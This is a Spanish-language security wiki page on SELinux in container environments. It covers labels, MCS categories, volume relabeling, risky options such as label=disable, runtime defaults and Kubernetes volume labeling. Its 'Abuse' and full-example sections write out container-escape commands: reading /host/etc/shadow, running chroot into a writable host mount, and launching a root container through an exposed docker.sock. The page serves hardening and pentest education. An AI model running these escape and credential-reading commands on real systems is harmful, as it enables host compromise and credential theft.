# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

SELinux es un sistema de **Mandatory Access Control basado en etiquetas**. Cada proceso y objeto relevante puede llevar un contexto de seguridad, y la policy decide qué dominios pueden interactuar con qué tipos y de qué manera. En entornos containerizados, esto normalmente significa que el runtime inicia el proceso del container bajo un dominio de container confinado y etiqueta el contenido del container con los tipos correspondientes. Si la policy funciona correctamente, el proceso puede leer y escribir los elementos que se espera que toque su etiqueta, mientras se le deniega el acceso a otro contenido del host, incluso si ese contenido se vuelve visible mediante un mount.

Esta es una de las protecciones del host más potentes disponibles en los despliegues de containers de Linux convencionales. Es especialmente importante en Fedora, RHEL, CentOS Stream, OpenShift y otros ecosistemas centrados en SELinux. En esos entornos, un reviewer que ignore SELinux a menudo no entenderá por qué una ruta aparentemente obvia hacia el compromiso del host está realmente bloqueada.

## AppArmor Vs SELinux

La diferencia general más sencilla es que AppArmor está basado en rutas, mientras que SELinux está **basado en etiquetas**. Esto tiene grandes consecuencias para la seguridad de los containers. Una policy basada en rutas puede comportarse de forma diferente si el mismo contenido del host se vuelve visible bajo una ruta de mount inesperada. Una policy basada en etiquetas, en cambio, comprueba cuál es la etiqueta del objeto y qué puede hacer el dominio del proceso con él. Esto no hace que SELinux sea sencillo, pero sí lo hace resistente frente a una clase de suposiciones basadas en trucos de rutas que los defenders pueden hacer accidentalmente en sistemas basados en AppArmor.

Dado que el modelo está orientado a etiquetas, la gestión de volúmenes de los containers y las decisiones de relabeling son críticas para la seguridad. Si el runtime o el operador cambia las etiquetas de forma demasiado amplia para "hacer que los mounts funcionen", el límite de la policy que debía contener el workload puede volverse mucho más débil de lo previsto.

## Lab

Para comprobar si SELinux está activo en el host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Para inspeccionar las etiquetas existentes en el host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Para comparar una ejecución normal con otra en la que el etiquetado está deshabilitado:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
En un host con SELinux habilitado, esta es una demostración muy práctica porque muestra la diferencia entre una carga de trabajo que se ejecuta bajo el container domain esperado y otra a la que se le ha eliminado esa capa de enforcement.

## Uso en Runtime

Podman está especialmente bien alineado con SELinux en sistemas donde SELinux forma parte de la configuración predeterminada de la plataforma. Podman rootless junto con SELinux es una de las bases de container mainstream más sólidas porque el proceso ya se ejecuta sin privilegios en el lado del host y sigue estando confinado por una política MAC. Docker también puede utilizar SELinux cuando es compatible, aunque en ocasiones los administradores lo deshabilitan para evitar problemas con el etiquetado de volúmenes. CRI-O y OpenShift dependen en gran medida de SELinux como parte de su modelo de aislamiento de containers. Kubernetes también puede exponer configuraciones relacionadas con SELinux, pero su valor depende, evidentemente, de que el sistema operativo del nodo admita y aplique realmente SELinux.<sup>[[2]](#references)</sup>

La lección recurrente es que SELinux no es un adorno opcional. En los ecosistemas construidos a su alrededor, forma parte del límite de seguridad esperado. Para la enumeración de políticas del host, el análisis de transiciones y el abuso de herramientas de administración de SELinux, consulta la [página general de SELinux](../../../interesting-files-permissions/selinux.md).

## Categorías MCS y Relabeling de Volúmenes

El aislamiento de containers normalmente combina **type enforcement** y **Multi-Category Security (MCS)**. Dos procesos pueden ejecutarse ambos como `container_t`, pero recibir niveles diferentes, como `s0:c123,c456` y `s0:c321,c654`. El contenido privado del container se etiqueta como `container_file_t` con las categorías correspondientes, por lo que simplemente alcanzar la ruta de otro container no basta para acceder a ella. Los runtimes normalmente asignan el par de categorías; reutilizar manualmente un nivel colapsa deliberadamente esta separación entre containers.<sup>[[3]](#references)</sup>

Compara las etiquetas de los procesos y de los mounts en lugar de comprobar únicamente el tipo:<sup>[[3]](#references)</sup>
```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```
Los sufijos de bind-mount cambian las etiquetas de inode del host y, por lo tanto, cambian el límite de seguridad, no solo los metadatos del mount:<sup>[[3]](#references)</sup>

- `:Z` aplica una etiqueta privada con las categorías MCS del container. Es apropiado para un volumen propiedad de un único container o Pod.
- `:z` aplica una etiqueta compartida para que otros containers confinados también puedan usar el contenido (sujeto a los permisos DAC). Usarlo para secrets o datos específicos de un tenant elimina el aislamiento MCS que, de otro modo, separaría los containers.
- El relabeling es recursivo. Aplicar cualquiera de las dos opciones a árboles amplios del host, como `/`, `/etc`, `/usr` o un árbol de home completo, puede exponer el contenido al container seleccionado y detener los servicios del host cuyas etiquetas esperadas hayan sido reemplazadas.

La reutilización manual de niveles es fácil de detectar en líneas de comandos y manifests. Los dos containers siguientes reciben intencionadamente el mismo nivel MCS y, por lo tanto, pueden usar contenido etiquetado para ese nivel:<sup>[[3]](#references)</sup>
```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```
También hay que distinguir `label=nested` de `label=disable`: el primero expone las operaciones de SELinux dentro del contenedor y permite cambios de etiquetas solo cuando la policy lo permite, mientras que el segundo elimina la separación de etiquetas para esa carga de trabajo. Ambos requieren revisión, pero no son equivalentes.<sup>[[3]](#references)</sup>

## Configuraciones incorrectas

El error clásico es `label=disable`. Operativamente, esto suele ocurrir porque se denegó un volume mount y la respuesta rápida a corto plazo fue eliminar SELinux de la ecuación en lugar de corregir el modelo de etiquetado.<sup>[[1]](#references)</sup> Otro error común es volver a etiquetar incorrectamente el contenido del host. Las operaciones de relabeling amplias pueden hacer que la aplicación funcione, pero también pueden ampliar mucho más de lo previsto originalmente el contenido que el contenedor puede manipular.

También es importante no confundir SELinux **instalado** con SELinux **efectivo**. Un host puede ser compatible con SELinux y seguir en modo permissive, o el runtime puede no estar iniciando la carga de trabajo bajo el domain esperado. En esos casos, la protección es mucho más débil de lo que podría sugerir la documentación.

## Abuse

Cuando SELinux está ausente, en modo permissive o ampliamente deshabilitado para la carga de trabajo, las rutas montadas del host son mucho más fáciles de abusar. El mismo bind mount que, de otro modo, estaría limitado por las etiquetas puede convertirse en una vía directa hacia los datos del host o hacia su modificación. Esto es especialmente relevante cuando se combina con writable volume mounts, directorios del container runtime o atajos operativos que exponen rutas sensibles del host por comodidad.

SELinux suele explicar por qué un writeup genérico de breakout funciona inmediatamente en un host, pero falla repetidamente en otro, aunque los flags del runtime parezcan similares. El elemento que falta con frecuencia no es un namespace ni una capability, sino un límite de etiquetas que permaneció intacto.

La comprobación práctica más rápida consiste en comparar el contexto activo y, después, probar las rutas montadas del host o los directorios del runtime que normalmente estarían confinados por etiquetas:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Si existe un bind mount del host y el etiquetado de SELinux se ha deshabilitado o debilitado, la divulgación de información suele ser lo primero:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Si el mount es escribible y el container es efectivamente root del host desde el punto de vista del kernel, el siguiente paso es probar una modificación controlada del host en lugar de adivinar:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
En hosts compatibles con SELinux, perder las etiquetas alrededor de los directorios de estado del runtime también puede exponer rutas directas de escalada de privilegios:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Estos comandos no sustituyen una cadena completa de escape, pero permiten determinar rápidamente si SELinux era lo que impedía el acceso a los datos del host o la modificación de archivos en el host.

### Ejemplo completo: SELinux deshabilitado + montaje del host con permisos de escritura

Si el etiquetado de SELinux está deshabilitado y el sistema de archivos del host está montado con permisos de escritura en `/host`, un escape completo del host se convierte en un caso normal de abuso de bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Si `chroot` se ejecuta correctamente, el proceso del contenedor ahora opera desde el sistema de archivos del host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Ejemplo completo: SELinux deshabilitado + directorio de runtime

Si el workload puede acceder a un socket de runtime una vez deshabilitadas las etiquetas, el escape puede delegarse al runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
La observación relevante es que SELinux a menudo era el control que impedía exactamente este tipo de acceso a rutas del host o al estado del runtime.

## Comprobaciones

El objetivo de las comprobaciones de SELinux es confirmar que SELinux está habilitado, identificar el contexto de seguridad actual y comprobar si los archivos o las rutas que te interesan están realmente confinados mediante etiquetas.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Qué es interesante aquí:

- `getenforce` debería devolver idealmente `Enforcing`; `Permissive` o `Disabled` cambia el significado de toda la sección de SELinux.
- Si el contexto del proceso actual parece inesperado o demasiado amplio, es posible que la carga de trabajo no se esté ejecutando bajo la política de contenedor prevista.
- Si los archivos montados desde el host o los directorios del runtime tienen etiquetas a las que el proceso puede acceder con demasiada libertad, los bind mounts se vuelven mucho más peligrosos.

Al revisar un contenedor en una plataforma compatible con SELinux, no trates el etiquetado como un detalle secundario. En muchos casos, es una de las principales razones por las que el host aún no está comprometido.

## Valores predeterminados del Runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | Dependiente del host | La separación de SELinux está disponible en hosts con SELinux habilitado, pero el comportamiento exacto depende de la configuración del host/daemon | `--security-opt label=disable`, reetiquetado amplio de bind mounts, `--privileged` |
| Podman | Habitualmente habilitado en hosts con SELinux | La separación de SELinux es una parte normal de Podman en sistemas con SELinux, salvo que se deshabilite | `--security-opt label=disable`, `label=false` en `containers.conf`, `--privileged` |
| Kubernetes | Asignado por el runtime en nodos con SELinux; configurable explícitamente | El runtime puede asignar una etiqueta única cuando el Pod no establece ninguna. `securityContext.seLinuxOptions` explícito controla la etiqueta del Pod/volumen; en Kubernetes 1.37, los volúmenes elegibles usan el etiquetado de montajes de SELinux de forma predeterminada | niveles MCS duplicados, nodos permisivos/deshabilitados, cargas de trabajo privilegiadas amplias, `seLinuxChangePolicy: Recursive` indiscriminado <sup>[[2]](#references)[[4]](#references)</sup> |
| Implementaciones de estilo CRI-O / OpenShift | Se suele depender mucho de él | SELinux suele ser una parte fundamental del modelo de aislamiento del nodo en estos entornos | políticas personalizadas que amplían demasiado el acceso, deshabilitar el etiquetado por motivos de compatibilidad |

Los valores predeterminados de SELinux dependen más de la distribución que los valores predeterminados de seccomp. En sistemas de estilo Fedora/RHEL/OpenShift, SELinux suele ser central para el modelo de aislamiento. En sistemas sin SELinux, simplemente no está presente.

## Etiquetado de volúmenes en Kubernetes 1.37

Kubernetes 1.37 hizo que `SELinuxMount` fuera estable y lo habilitó de forma predeterminada. Para un PVC elegible, un Pod con `seLinuxOptions` y un driver CSI que anuncie `.spec.seLinuxMount: true`, kubelet usa `-o context=<label>` en lugar de pedir al runtime que reetiquete recursivamente cada inode. Los drivers y tipos de volumen no compatibles siguen usando la ruta recursiva. Esto evita un recorrido de reetiquetado grande y también evita cambiar las etiquetas persistentes de todos los archivos simplemente para exponer el volumen a un Pod.<sup>[[2]](#references)[[4]](#references)</sup>

Un mount solo puede llevar un contexto de este tipo. En consecuencia, los Pods con **etiquetas de SELinux diferentes** que usan el mismo volumen elegible en el mismo nodo ya no coexisten bajo el comportamiento predeterminado de `MountOption`: uno permanece en `ContainerCreating` con un error de `conflicting SELinux labels of volume`. Trátalo tanto como un problema de disponibilidad como una indicación útil de que las cargas de trabajo estaban compartiendo almacenamiento implícitamente entre límites MCS. Si ese uso compartido es intencional—for example, un Pod privilegiado `spc_t` y un Pod confinado que usan el mismo volumen—el mecanismo de escape de compatibilidad por Pod es `seLinuxChangePolicy: Recursive`; no lo apliques en todo el clúster sin comprender qué rutas reetiquetará el runtime.<sup>[[2]](#references)[[4]](#references)</sup>
```yaml
spec:
securityContext:
seLinuxOptions:
level: "s0:c123,c456"
seLinuxChangePolicy: Recursive
```
Comprobaciones útiles del lado del clúster:<sup>[[2]](#references)</sup>
```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.securityContext.seLinuxOptions or
.spec.securityContext.seLinuxChangePolicy) |
[.metadata.namespace,.metadata.name,
(.spec.securityContext.seLinuxOptions.level // "-"),
(.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
grep -Ei 'SELinux|conflicting SELinux labels'
```
El `selinux-warning-controller` opcional de `kube-controller-manager` detecta los Pods que comparten un volumen con etiquetas incompatibles y expone la métrica `selinux_warning_controller_selinux_volume_conflict`. Habilítalo y revísalo antes de realizar actualizaciones o cambiar el comportamiento del etiquetado de volúmenes; ayuda a distinguir un conflicto de políticas genuino de un fallo ordinario de CSI o del sistema de archivos.<sup>[[2]](#references)</sup>

## References

- [1] [Documentación de Podman: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configurar un contexto de seguridad para un Pod o contenedor](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Documentación de podman run: etiquetas de SELinux y reetiquetado de volúmenes](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Lanzamiento de Kubernetes v1.37: SELinuxMount y SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
